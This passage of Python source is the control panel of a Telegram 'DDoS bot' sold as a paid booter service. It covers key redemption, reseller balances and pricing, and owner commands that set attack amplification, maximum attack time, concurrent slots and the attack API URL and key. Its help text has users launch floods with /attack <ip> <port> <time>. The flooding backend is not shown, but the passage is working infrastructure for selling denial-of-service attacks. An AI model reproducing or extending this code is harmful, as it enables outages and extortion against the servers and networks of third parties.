        safe_send_message(message.chat.id, "📋 No resellers found!", reply_to=message)
        return
    
    response = "📊 **RESELLERS LIST**\n\n"
    
    for rid, reseller in resellers.items():
        username = reseller.get('username', 'Unknown')
        balance = reseller.get('balance', 0)
        response += f"• `{rid}` - {username} - 💰 {balance} Rs\n"
    
    response += f"\n👥 Total: {len(resellers)}"
    safe_send_message(message.chat.id, response)

@bot.message_handler(commands=["all_users"])
def all_users_command(message):
    if not is_owner(message.from_user.id):
        bot.send_message(message.chat.id, "❌ Owner only!")
        return
    
    users = get_users()
    if not users:
        bot.send_message(message.chat.id, "📋 No users found!")
        return
    
    response = "📊 **ACTIVE & UPCOMING USERS LEDGER**\n"
    response += "━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    now_ist = datetime.now(IST)
    active_count = 0

    for uid, user in users.items():
        raw_username = str(user.get('username', 'Unknown'))
        username = raw_username.replace('_', ' ').replace('*', '').replace('`', '').replace('[', '').replace(']', '')

        key_expiry = user.get('key_expiry')
        key_start = user.get('key_start')
        status_line = ""

        if key_expiry:
            try:
                expiry = datetime.fromisoformat(key_expiry).astimezone(IST)
                
                if key_start:
                    start_t = datetime.fromisoformat(key_start).astimezone(IST)
                else:
                    start_t = now_ist

                # EXPIRED USERS REMOVED HERE
                if now_ist >= expiry:
                    continue
                
                elif now_ist < start_t:
                    start_str = start_t.strftime('%H:%M')
                    total_runtime = expiry - start_t
                    r_hours, r_remainder = divmod(total_runtime.seconds, 3600)
                    r_minutes, _ = divmod(r_remainder, 60)
                    
                    status_line = (
                        f"• ID: `{uid}` | {username} |\n"
                        f"  🟨 **UPCOMING** ➜ Starts at `{start_str}` (Duration: {r_hours}h {r_minutes}m)\n"
                    )
                    active_count += 1
                
                else:
                    remaining = expiry - now_ist
                    days = remaining.days
                    hours, remainder = divmod(remaining.seconds, 3600)
                    minutes, _ = divmod(remainder, 60)
                    
                    status_line = f"• ID: `{uid}` | {username} | ✅ **ACTIVE** ➜ `{days}d {hours}h {minutes}m left`\n"
                    active_count += 1

            except Exception as e:
                logging.error(f"Date Parse Error for User ID {uid}: {e}")
                continue

        if len(response) + len(status_line) > 3500:
            bot.send_message(message.chat.id, response, parse_mode="Markdown")
            response = "" 
            
        response += status_line
    
    if active_count == 0:
        response += "📋 No active or upcoming users currently running.\n"

    footer = f"\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n📈 **Total Active Records:** {active_count}"
    response += footer
    
    try:
        bot.send_message(message.chat.id, response, parse_mode="Markdown")
    except Exception as final_err:
        logging.error(f"Failed rendering markdown layout block: {final_err}")
        bot.send_message(message.chat.id, response, parse_mode=None)

@bot.message_handler(commands=["add_user"])
def add_user_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.send_message(message.chat.id, "❌ Owner only!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        bot.send_message(message.chat.id, "⚠️ Usage: /add_user <user_id> <days>")
        return
    
    try:
        target_id = int(command_parts[1])
        days = int(command_parts[2])
    except:
        bot.send_message(message.chat.id, "❌ Invalid user ID or days!")
        return
    
    users = get_users()
    expiry_time = datetime.now(IST) + timedelta(days=days)
    
    try:
        chat = bot.get_chat(target_id)
        username = chat.username or chat.first_name or str(target_id)
    except:
        username = str(target_id)
    
    users[str(target_id)] = {
        'user_id': target_id,
        'username': username,
        'key_expiry': expiry_time.isoformat(),
        'key_duration_label': f"{days} days",
        'key_duration_seconds': days * 86400,
        'added_at': datetime.now(IST).isoformat(),
        'redeemed_key': 'MANUAL_APPROVAL'
    }
    save_users(users)
    
    bot.send_message(message.chat.id, f"✅ User {target_id} added for {days} days!\nExpires: {expiry_time.strftime('%Y-%m-%d %H:%M:%S')}")
    
    try:
        bot.send_message(target_id, f"🎉 You have been approved!\n\n📅 Access expires: {expiry_time.strftime('%Y-%m-%d %H:%M:%S')}\n\nUse /attack to start!")
    except:
        pass

@bot.message_handler(commands=["removeuser"])
def removeuser_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: `/removeuser <userid>`", reply_to=message)
        return
    
    target_id, resolved_name = resolve_user(command_parts[1])
    if not target_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    target_id_str = str(target_id)
    
    users = get_users()
    user_existed = False
    if target_id_str in users:
        del users[target_id_str]
        save_users(users)
        user_existed = True
    
    all_bookings = load_json(SLOTS_FILE, {})
    new_bookings = {bid: info for bid, info in all_bookings.items() 
                    if str(info.get('user_id')) != target_id_str}
    
    slots_removed = len(all_bookings) - len(new_bookings)
    save_json(SLOTS_FILE, new_bookings)

    if user_existed or slots_removed > 0:
        response = (f"✅ **USER REMOVED**\n"
                   f"👤 **ID:** `{target_id_str}`\n"
                   f"🛡️ **Slots Freed:** `{slots_removed}` hours\n\n"
                   f"📊 Bot capacity has been updated.")
        safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")
    else:
        safe_send_message(message.chat.id, "❌ User not found in active database.", reply_to=message)

@bot.message_handler(commands=["saldoadd"])
def saldoadd_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, "⚠️ Usage: /saldoadd <id or @username> <amount>", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    try:
        amount = int(command_parts[2])
    except:
        safe_send_message(message.chat.id, "❌ Invalid amount!", reply_to=message)
        return
    
    resellers = get_resellers()
    if str(reseller_id) not in resellers:
        safe_send_message(message.chat.id, "❌ Reseller not found!", reply_to=message)
        return
    
    resellers[str(reseller_id)]['balance'] = resellers[str(reseller_id)].get('balance', 0) + amount
    save_resellers(resellers)
    
    safe_send_message(message.chat.id, f"✅ Balance Added!\n\n👤 Reseller: {resolved_name or reseller_id}\n➕ Added: {amount} Rs\n💰 New Balance: {resellers[str(reseller_id)]['balance']} Rs", reply_to=message)

@bot.message_handler(commands=["mysaldo"])
def my_saldo_command(message):
    user_id = message.from_user.id
    if not is_reseller(user_id):
        safe_send_message(message.chat.id, "❌ You are not a reseller!", reply_to=message)
        return
    
    reseller = get_reseller(user_id)
    safe_send_message(message.chat.id, f"💰 Your Balance\n\n💵 Balance: {reseller.get('balance', 0)} Rs", reply_to=message)

@bot.message_handler(commands=["prices"])
def prices_command(message):
    user_id = message.from_user.id
    if not is_reseller(user_id) and not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command is for resellers only!", reply_to=message)
        return
    
    response = "═══════════════════════════\n"
    response += "💵 KEY PRICING\n"
    response += "═══════════════════════════\n\n"
    
    for dur, info in RESELLER_PRICING.items():
        response += f"🔴 {info['label']:<9} ➜  {info['price']} Rs\n"
    
    response += "\n═══════════════════════════"
    safe_send_message(message.chat.id, response, reply_to=message)

@bot.message_handler(commands=["maxconcurrent"])
def maxconcurrent_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        current = get_max_slots()
        safe_send_message(message.chat.id, f"⚙️ Current Max Slots: {current}\n\nUsage: /maxconcurrent <number>", reply_to=message)
        return
    
    try:
        new_value = int(command_parts[1])
        if new_value < 1 or new_value > MAX_SLOTS_LIMIT:
            safe_send_message(message.chat.id, f"❌ Value must be between 1 and {MAX_SLOTS_LIMIT}!", reply_to=message)
            return
        set_max_slots(new_value)
        safe_send_message(message.chat.id, f"✅ Max Concurrent Slots set to: {new_value}", reply_to=message)
    except:
        safe_send_message(message.chat.id, "❌ Invalid number!", reply_to=message)

@bot.message_handler(commands=["cooldown"])
def cooldown_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        current = get_user_cooldown_setting()
        safe_send_message(message.chat.id, f"⏳ Current Cooldown: {current}s\n\nUsage: /cooldown <seconds>", reply_to=message)
        return
    
    try:
        new_value = int(command_parts[1])
        if new_value < 0:
            safe_send_message(message.chat.id, "❌ Cooldown cannot be negative!", reply_to=message)
            return
        set_setting('user_cooldown', new_value)
        safe_send_message(message.chat.id, f"✅ Cooldown set to: {new_value}s", reply_to=message)
    except:
        safe_send_message(message.chat.id, "❌ Invalid number!", reply_to=message)

@bot.message_handler(commands=["maxattack"])
def maxattack_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        current = get_max_attack_time()
        safe_send_message(message.chat.id, f"⚙️ Current Max Attack Time: {current}s\n\nUsage: /maxattack <seconds>", reply_to=message)
        return
    
    try:
        new_value = int(command_parts[1])
        if new_value < MIN_ATTACK_TIME:
            safe_send_message(message.chat.id, f"❌ Value must be at least {MIN_ATTACK_TIME} seconds!", reply_to=message)
            return
        set_max_attack_time(new_value)
        safe_send_message(message.chat.id, f"✅ Max Attack Time set to: {new_value}s", reply_to=message)
    except:
        safe_send_message(message.chat.id, "❌ Invalid number!", reply_to=message)

@bot.message_handler(commands=["concurrent"])
def concurrent_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        current = get_attack_amplification()
        safe_send_message(message.chat.id, f"💪 Current Attack Amplification: {current}x\n\nUsage: /concurrent <number>", reply_to=message)
        return
    
    try:
        new_value = int(command_parts[1])
        if new_value < 1 or new_value > 20:
            safe_send_message(message.chat.id, "❌ Value must be between 1-20!", reply_to=message)
            return
        set_attack_amplification(new_value)
        safe_send_message(message.chat.id, f"✅ Attack Amplification set to: {new_value}x", reply_to=message)
    except:
        safe_send_message(message.chat.id, "❌ Invalid number!", reply_to=message)

@bot.message_handler(commands=["adminpanel"])
def adminpanel_command(message):
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        safe_send_message(message.chat.id, "❌ Admin only command!", reply_to=message)
        return
    
    busy_slots, free_slots, total_slots = get_slot_status()
    
    adminstats = admin_attack_stats.get(user_id, {'total': 0, 'last_attack': None, 'attacks': []})
    recent_attacks = adminstats['attacks'][-5:] if adminstats['attacks'] else []
    
    panel_text = f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👑 **ADMIN PANEL**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚙️ **BOT STATUS:**
• Free Slots: {free_slots}/{total_slots} {'🟢' if free_slots > 0 else '🔴'}
• Active Attacks: {busy_slots}
• Total Users: {len(get_users())}
• Resellers: {len(get_resellers())}

📊 **YOUR STATS:**
• Total Attacks: {adminstats['total']}
• Last Attack: {adminstats['last_attack'].strftime('%d-%m-%Y %H:%M:%S') if adminstats['last_attack'] else 'Never'}

📜 **RECENT ATTACKS (Last 5):**
"""
    
    if recent_attacks:
        for i, attack in enumerate(reversed(recent_attacks), 1):
            time_str = attack['time'].strftime('%H:%M:%S')
            panel_text += f"   {i}. {attack['target']}:{attack['port']} - {attack['duration']}s ({time_str})\n"
    else:
        panel_text += f"   ❌ No attacks yet\n"
    
    panel_text += f"""
⚡ **ADMIN INFO:**
• Role: {'👑 Owner' if is_owner(user_id) else '👥 Admin'}
• Cooldown: {'❌ No cooldown' if is_owner(user_id) else '✅ Normal cooldown'}

📋 **QUICK COMMANDS:**
• /status - Check slots
• /attack - Launch attack
• /mykey - Key details
• /admins - List all admins (owner only)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    safe_send_message(message.chat.id, panel_text, reply_to=message, parse_mode="Markdown")
    
@bot.message_handler(commands=["blockip"])
def blockip_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /blockip <ip_prefix>\nExample: /blockip 192.168.", reply_to=message)
        return
    
    if add_blocked_ip(command_parts[1]):
        safe_send_message(message.chat.id, f"✅ IP blocked: {command_parts[1]}*", reply_to=message)
    else:
        safe_send_message(message.chat.id, "❌ IP already blocked!", reply_to=message)

@bot.message_handler(commands=["unblockip"])
def unblockip_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /unblockip <ip_prefix>", reply_to=message)
        return
    
    if remove_blocked_ip(command_parts[1]):
        safe_send_message(message.chat.id, f"✅ IP unblocked: {command_parts[1]}*", reply_to=message)
    else:
        safe_send_message(message.chat.id, "❌ IP not found in blocked list!", reply_to=message)

@bot.message_handler(commands=["blockedips"])
def blockedips_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    blocked = get_blockedips()
    if not blocked:
        safe_send_message(message.chat.id, "📋 No IPs are blocked!", reply_to=message)
        return
    
    response = "🚫 BLOCKED IPs\n\n"
    for i, ip in enumerate(blocked, 1):
        response += f"{i}. `{ip}`*\n"
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["maintenance"])
def maintenance_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /maintenance <message>", reply_to=message)
        return
    
    set_maintenance_mode(True, command_parts[1])
    safe_send_message(message.chat.id, f"🔧 Maintenance Mode ON!\n\nMessage: {command_parts[1]}\n\nUse /ok to turn off", reply_to=message)

@bot.message_handler(commands=["ok"])
def ok_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    set_maintenance_mode(False)
    safe_send_message(message.chat.id, "✅ Maintenance Mode OFF!\n\nBot is now normal.", reply_to=message)

@bot.message_handler(commands=["live"])
def live_stats_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    uptime = datetime.now(IST) - BOT_START_TIME
    hours, remainder = divmod(int(uptime.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    
    process = psutil.Process()
    memory_mb = process.memory_info().rss / 1024 / 1024
    cpu_percent = process.cpu_percent(interval=0.1)
    
    total_users = len(get_users())
    busy_slots, free_slots, total_slots = get_slot_status()
    
    response = f"""
📊 **SERVER STATISTICS**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🤖 𝗕𝗢𝗧 𝗜𝗡𝗙𝗢:
• 𝗨𝗣𝗧𝗜𝗠𝗘: {hours:02d}:{minutes:02d}:{seconds:02d}
• 𝗠𝗘𝗠𝗢𝗥𝗬: {memory_mb:.1f} 𝗠𝗕
• 𝗖𝗣𝗨: {cpu_percent:.1f}%

⚔️ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗧𝗨𝗦:
• 𝗔𝗖𝗧𝗜𝗩𝗘 𝗔𝗧𝗧𝗔𝗖𝗞𝗦: {busy_slots}/{total_slots}
• 𝗙𝗥𝗘𝗘 𝗦𝗟𝗢𝗧𝗦: {free_slots}
• 𝗠𝗔𝗫 𝗦𝗟𝗢𝗧𝗦: {total_slots}
• 𝗔𝗧𝗧𝗔𝗖𝗞 𝗔𝗠𝗣𝗟𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡: {get_attack_amplification()}𝘅

⚙️ 𝗦𝗘𝗧𝗧𝗜𝗡𝗚𝗦:
• 𝗠𝗔𝗫 𝗔𝗧𝗧𝗔𝗖𝗞 𝗧𝗜𝗠𝗘: {get_max_attack_time()}s
• 𝗙𝗔𝗦𝗧 𝗖𝗢𝗢𝗟𝗗𝗢𝗪𝗡: {FAST_COOLDOWN_SECONDS}s
• 𝗠𝗔𝗜𝗡 𝗖𝗢𝗢𝗟𝗗𝗢𝗪𝗡: {MAIN_COOLDOWN_SECONDS}s

📈 𝗕𝗢𝗧 𝗗𝗔𝗧𝗔
• 𝗧𝗢𝗧𝗔𝗟 𝗨𝗦𝗘𝗥𝗦: {total_users}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["broadcast"])
def broadcast_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only command!", reply_to=message)
        return
    
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /broadcast <message>", reply_to=message)
        return
    
    broadcast_msg = command_parts[1]
    
    all_users = set()
    users = get_users()
    for uid in users:
        all_users.add(int(uid))
    resellers = get_resellers()
    for rid in resellers:
        all_users.add(int(rid))
    bot_users = get_bot_users()
    for bid in bot_users:
        all_users.add(int(bid))
    
    sent_count = 0
    failed_count = 0
    
    progress_msg = safe_send_message(message.chat.id, f"📢 Broadcasting to {len(all_users)} users...", reply_to=message)
    
    for uid in all_users:
        try:
            if uid == BOT_OWNER:
                continue
            bot.send_message(uid, f"📢 **BROADCAST**\n\n{broadcast_msg}", parse_mode="Markdown")
            sent_count += 1
            time.sleep(0.05)
        except:
            failed_count += 1
    
    try:
        bot.edit_message_text(
            f"✅ Broadcast Complete!\n\n👤 Sent: {sent_count}\n❌ Failed: {failed_count}",
            message.chat.id,
            progress_msg.message_id
        )
    except:
        safe_send_message(message.chat.id, f"✅ Broadcast Complete!\n\n👤 Sent: {sent_count}\n❌ Failed: {failed_count}", reply_to=message)

@bot.message_handler(commands=["broadcastreseller"])
def broadcastreseller_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only command!", reply_to=message)
        return
    
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /broadcastreseller <message>", reply_to=message)
        return
    
    broadcast_msg = command_parts[1]
    
    resellers = get_resellers()
    reseller_ids = list(resellers.keys())
    
    sent_count = 0
    failed_count = 0
    
    for rid in reseller_ids:
        try:
            bot.send_message(int(rid), f"📢 **RESELLER NOTICE**\n\n{broadcast_msg}", parse_mode="Markdown")
            sent_count += 1
            time.sleep(0.05)
        except:
            failed_count += 1
    
    safe_send_message(message.chat.id, f"✅ Reseller Broadcast Complete!\n\n👤 Sent: {sent_count}\n❌ Failed: {failed_count}", reply_to=message)

@bot.message_handler(commands=["broadcastpaid"])
def broadcastpaid_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only command!", reply_to=message)
        return
    
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /broadcastpaid <message>", reply_to=message)
        return
    
    broadcast_msg = command_parts[1]
    
    now = datetime.now(IST)
    users = get_users()
    paid_users = []
    
    for uid, user in users.items():
        if user.get('key_expiry'):
            expiry = datetime.fromisoformat(user['key_expiry'])
            if expiry.tzinfo is None:
                expiry = IST.localize(expiry)
            if expiry > now:
                paid_users.append(int(uid))
    
    sent_count = 0
    failed_count = 0
    
    for uid in paid_users:
        try:
            if uid == BOT_OWNER:
                continue
            bot.send_message(uid, f"💎 **PAID USER ANNOUNCEMENT**\n\n{broadcast_msg}", parse_mode="Markdown")
            sent_count += 1
            time.sleep(0.05)
        except:
            failed_count += 1
    
    safe_send_message(message.chat.id, f"✅ Paid Broadcast Complete!\n\n👤 Sent: {sent_count}\n❌ Failed: {failed_count}", reply_to=message)

@bot.message_handler(commands=["owner"])
def owner_settings_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    busy_slots, free_slots, total_slots = get_slot_status()
    
    help_text = f"""
👑 𝗢𝗪𝗡𝗘𝗥 𝗣𝗔𝗡𝗘𝗟
**⚙️ SETTINGS:**
• Max Attack: {get_max_attack_time()}s
• Fast Cooldown: {FAST_COOLDOWN_SECONDS}s
• Main Cooldown: {MAIN_COOLDOWN_SECONDS}s
• Slots: {free_slots}/{total_slots}

🔑 𝗞𝗘𝗬𝗦
• /gen <duration> <count> [del_min] - Create Keys
• /redeem <key> - Claim Key
• /activekeys - Audit Active Keys
• /unusedkeys - View Unredeemed Keys
• /expiredkeys - View Expired Keys
• /extendall <time> - Extend running keys
• /delkey <key> - Delete Specific Key
• /delallkeys - Wipe All Keys
• /delunusedkeys - Wipe Unredeemed Keys
• /delexpiredkeys - Wipe Expired Keys
• /delactivekeys - Wipe Active Keys

👥 𝗨𝗦𝗘𝗥𝗦
• /addreseller <id_or_username> - Add Reseller
• /removereseller <id_or_username> - Remove Reseller
• /saldoadd <id_or_username> <amount> - Add Balance
• /all_users - View Active & Upcoming Users
• /cleanexpired - Wipe Expired Users
• /add_user <user_id> <days> - Manual Approve
• /removeuser <userid> - Delete User & Free Slots
• /admins - List All Authorized Admins
• /addadmin <user_id> - Appoint New Admin
• /removeadmin <user_id> - Revoke Admin

⚡ 𝗔𝗧𝗧𝗔𝗖𝗞
• /url <new_url> - Change API URL
• /key <new_key> - Change API Key
• /maxattack <seconds> - Set Global Max Time
• /setmaxtime <user_id> <seconds> - Set User Max
• /blockip <ip> - Block Target IP Prefix
• /unblockip <ip> - Unblock Target IP
• /blockport <port> - Block Target Port
• /unblockport <port> - Unblock Target Port
• /cooldown <seconds> - Set Global Cooldown
• /setfastcooldown <id> <sec> - Force Fast CD
• /setmaincooldown <id> <sec> - Force Main CD
• /removecooldown <id> - Clear Individual CD
• /clearallcooldown - Reset All Cooldowns
• /maxconcurrent <num> - Set Server Max Slots
• /concurrent <num> - Set Attack Amplification
• /redeemlimit <num> - Set Bot Capacity Limit
• /clearslots - Clear Master Capacity Board

💣 𝗠𝗢𝗡𝗜𝗧𝗢𝗥
• /allattacks - Graphical Active Attacks
• /attacklist - Simple Active Attacks
• /userstatus <user_id> - Single User Status
• /allusersstatus - View Group Status
• /checkcooldown <id> - Audit User CD
• /checkmaxtime <id> - Check Custom Max Time
• /allmaxtime - List Custom Max Rules
• /activeadmins - Attacking Admins
• /adminstats - Admins Attack Metrics
• /adminattacks <id> - View Admin History
• /all_resellers - View Resellers Directory
• /api_list - Complete APIs Profile
• /apistatus - Check Endpoints Status
• /apion <api_name> - Enable API
• /apioff <api_name> - Disable API
• /apilogs - View Recent API Requests
• /addapi <params> - Add API Config
• /removeapi <api_name> - Delete API Config
• /blocked_ports - Banned Ports Directory
• /blockedips - Banned IPs Directory

📢 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧
• /broadcast <msg> - Msg All Recorded Users
• /broadcastreseller <msg> - Msg All Resellers
• /broadcastpaid <msg> - Msg Premium Active Users

🔧 𝗦𝗬𝗦𝗧𝗘𝗠
• /maintenance <msg> - Maintenance Mode ON
• /ok - Maintenance Mode OFF
• /live - Real-time Server Stats
"""
    try:
        bot.reply_to(message, help_text, parse_mode="Markdown")
    except:
        bot.reply_to(message, help_text, parse_mode=None)


@bot.message_handler(commands=['help'])
def show_help(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    common_cmds = """
🔐 REGULAR COMMANDS:
• /id - View your ID
• /rules - Check Rules
• /ping - Check Status
• /mykey - Key Details
• /myinfo - Account Info
• /status - Attack Status
• /redeemstatus - View Capacity Board
• /redeem <key> - Claim Key
• /attack <ip> <port> <time> - Start
"""

    if is_owner(user_id):
        help_text = f"👑 **WELCOME OWNER**\n\nUse `/owner` for the full Admin Panel.\n{common_cmds}"
    elif is_reseller(user_id):
        help_text = f"💼 **RESELLER PANEL**\n\n• /mysaldo - Check Balance\n• /prices - View Pricing\n• /gen <time> <count> - Create Keys\n{common_cmds}"
    else:
        help_text = f"🛡️ **USER MENU**\n{common_cmds}\n\n**Support:** @dxtechtor_owner"

    try:
        bot.reply_to(message, help_text, parse_mode="Markdown")
    except:
        bot.reply_to(message, help_text, parse_mode=None)

@bot.message_handler(commands=["delkey"])
def delete_key_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        return

    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ **Usage:** `/delkey <key_string>`", parse_mode="Markdown")
        return

    key_input = command_parts[1].upper().strip()
    keys = get_keys()
    
    if key_input not in keys:
        bot.reply_to(message, "❌ **Error:** That key does not exist in the database.", parse_mode="Markdown")
        return

    key_doc = keys[key_input]

    if key_doc.get('used') == True or key_doc.get('used_by'):
        used_by_user = key_doc.get('used_by', 'Unknown ID')
        bot.reply_to(
            message, 
            f"🚫 **DELETION BLOCKED**\n\n"
            f"This key has already been redeemed by User ID: `{used_by_user}`.\n"
            f"If you want to terminate their access, use: `/removeuser {used_by_user}` instead.",
            parse_mode="Markdown"
        )
        return

    del keys[key_input]
    save_keys(keys)

    success_msg = (
        f"🗑️ **KEY DELETED SUCCESSFULLY**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔑 **Key:** `{key_input}`\n"
        f"⏱️ **Duration Was:** {key_doc.get('duration_label', 'Unknown')}\n\n"
        f"✨ This key has been completely wiped and can no longer be redeemed by anyone."
    )
    bot.reply_to(message, success_msg, parse_mode="Markdown")
    

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    
    track_bot_user(user_id, message.from_user.username)
    if check_maintenance(message): return
    if check_banned(message): return
    
    if is_owner(user_id):
        response = f'''👑 Welcome dx Owner, {user_name}!

Use /owner to access the full owner panel.
Use /help to see basic commands.'''
    elif is_reseller(user_id):
        response = f'''💼 Welcome Reseller, {user_name}!

Use /help to see your commands.'''
    else:
        response = f'''👋 Welcome, {user_name}!

🔐 **Commands:**
• /rules- Check Rules
• /redeem <key> - Redeem a key
• /mykey - View key details
• /myinfo - View Account details
• /status - View attack status
• /attack <ip> <port> <time> - Start an attack (min 60s)

DDOS BOT OWNER - @dxtechtor_owner
'''
    
    safe_send_message(message.chat.id, response, reply_to=message)

print("=" * 60)
print("🔥 dx DDOS BOT STARTING...")
print("=" * 60)
print(f"🤖 Bot Token has been securely loaded via OS Env Variables")
print(f"🎯 API: Maxx (Min {MIN_ATTACK_TIME}s)")
print(f"⚙️ Max Concurrent Slots: {get_max_slots()}")
print(f"💪 Attack Amplification: {get_attack_amplification()}x")
print(f"⚡ Fast Cooldown: {FAST_COOLDOWN_SECONDS}s (Attack send hone ke baad)")
print(f"🐢 Main Cooldown: {MAIN_COOLDOWN_SECONDS}s (Attack complete hone ke baad)")
print("=" * 60)

def save_user_slot(user_id, slot_time):
    try:
        data = load_json(SLOTS_FILE, {})
        data[str(user_id)] = {
            "slot": slot_time,
            "date": datetime.now(IST).strftime("%Y-%m-%d")
        }
        save_json(SLOTS_FILE, data)
    except Exception as e:
        logging.error(f"Error saving user slot: {e}")

def get_bot_settings():
    default = {
        "max_per_slot": 5,
        "slots": ["10:30-11:30", "11:30-12:30", "12:30-01:30", "01:30-02:30", "02:30-03:30"]
    }
    return load_json(SETTINGS_FILE, default)

def save_bot_settings(settings):
    save_json(SETTINGS_FILE, settings)

def get_slot_counts():
    try:
        if not os.path.exists(SLOTS_FILE): return {}
        data = load_json(SLOTS_FILE, {})
        counts = {}
        today = datetime.now(IST).strftime("%Y-%m-%d")
        for uid, info in data.items():
            if info.get('date') == today:
                slot = info.get('slot')
                counts[slot] = counts.get(slot, 0) + 1
        return counts
    except: return {}

def execute_final_redemption(user_id, first_name, key_input, key_doc, blocks_to_block, duration_sec, available_dt, has_active, current_expiry, now_ist, chat_id, message_id, is_callback=False, is_buffered=False):
    all_bookings = load_json(SLOTS_FILE, {})
    
    for i in range(blocks_to_block):
        target_dt = available_dt + timedelta(minutes=i * 30)
        booking_id = f"PAID_{user_id}_{target_dt.strftime('%Y%m%d_%H%M')}_{random.randint(100,999)}"
        all_bookings[booking_id] = {
            "user_id": str(user_id),
            "start": target_dt.strftime("%H:%M"),
            "date": target_dt.strftime("%Y-%m-%d")
        }
    save_json(SLOTS_FILE, all_bookings)

    users = get_users()
    if has_active:
        new_expiry_time = current_expiry + timedelta(seconds=duration_sec)
        key_start_time = now_ist
        label = f"Extended {key_doc['duration_label']}"
    else:
        if is_buffered:
            key_start_time = now_ist
            new_expiry_time = available_dt + timedelta(minutes=blocks_to_block * 30)
        else:
            key_start_time = available_dt
            new_expiry_time = available_dt + timedelta(seconds=duration_sec)
        label = key_doc['duration_label']
    
    users[str(user_id)] = {
        'user_id': user_id,
        'username': first_name,
        'key_start': key_start_time.isoformat(), 
        'key_expiry': new_expiry_time.isoformat(),
        'key_duration_label': label,
        'redeemed_key': key_input
    }
    save_users(users)

    keys = get_keys()
    key_doc.update({'used': True, 'used_by': user_id, 'used_at': now_ist.isoformat()})
    keys[key_input] = key_doc
    save_keys(keys)
    
    success_text = f"✅ **KEY REDEEMED SUCCESSFULLY!**\n\n🕒 **Plan Active From:** `{available_dt.strftime('%H:%M')}`\n⏳ **Plan Expiry Time:** `{new_expiry_time.strftime('%Y-%m-%d %H:%M')}`"
    
    if is_callback:
        bot.edit_message_text(success_text, chat_id=chat_id, message_id=message_id, parse_mode="Markdown")
    else:
        bot.send_message(chat_id, success_text, reply_to_message_id=message_id, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith('cf_rdm|') or call.data.startswith('cn_rdm|'))
def handle_confirmation_callbacks(call):
    action, tx_id = call.data.split('|')
    tx_data = pending_redemptions.get(tx_id)
    
    if not tx_data:
        bot.answer_callback_query(call.id, "❌ Session expired! Please run /redeem again.", show_alert=True)
        try: bot.delete_message(call.message.chat.id, call.message.message_id)
        except: pass
        return

    if action == "cn_rdm":
        del pending_redemptions[tx_id]
